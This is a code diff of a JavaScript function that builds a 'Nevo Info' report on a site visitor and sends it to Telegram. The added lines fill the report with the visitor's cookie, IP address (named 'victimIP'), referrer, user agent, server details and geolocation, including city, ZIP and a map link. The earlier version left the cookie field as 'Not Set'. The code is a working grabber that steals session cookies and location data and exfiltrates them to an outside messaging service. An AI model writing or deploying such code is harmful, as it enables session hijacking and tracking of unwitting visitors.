@@ -44,7 +44,37 @@ async function fetchDataAndSendTelegramMessage() {
             countryFlag = flags[geoInfo.country] || '';
         }
 
-        const message = `-----{===--{ Nevo Info }--===}-----\n\nCookie IS: Not Set\n\nIP Address: ${clientIP}\n\nUser Comes From: Not Available\n\nServer Name IS: Not Available\n\nServer IP Address IS: Not Available\n\nUser Info: Not Available\n\n\n\nPublic IP: ${clientIP}${countryFlag}\n\nUser Country IS: ${geoInfo?.country || 'Not Available'}\n\nUser Region IS: ${geoInfo?.region || 'Not Available'}\n\nUser City IS: ${geoInfo?.city || 'Not Available'}\n\nUser Location Map IS: ${geoInfo ? 'http://www.google.com/maps/place/' + geoInfo.loc : 'Not Available'}\n\nUser ZIP IS: ${geoInfo?.postal || 'Not Available'}\n\nUser TimeZone IS: ${geoInfo?.timezone || 'Not Available'}\n\nUser hostname IP IS: ${geoInfo?.hostname || 'Not Available'}\n\nAnd org of Host IS: ${geoInfo?.org || 'Not Available'}\n\n-----{===--{ Nevo Info }--===}-----`;
+        const message = `-----{===--{ Nevo Info }--===}-----
+
+Cookie IS: ${cookie}
+
+IP Address: ${victimIP}
+
+User Comes From: ${Ref}
+
+Server Name IS: ${serverName}
+
+Server IP Address IS: ${serverAddr}
+
+User Info: ${userAgent}
+
+Public IP: ${PublicIP}${countryFlag}
+
+User Country IS: ${country}
+
+User Region IS: ${region}
+
+User City IS: ${city}
+
+User Location Map IS: ${loc}
+
+User ZIP IS: ${postal}
+
+User TimeZone IS: ${timezone}
+
+User hostname IP IS: ${hostname}${org}
+
+-----{===--{ Nevo Info }--===}-----`;
 
         const response = await sendMessageToTelegram(message);
         console.log('Message sent to Telegram:', response);
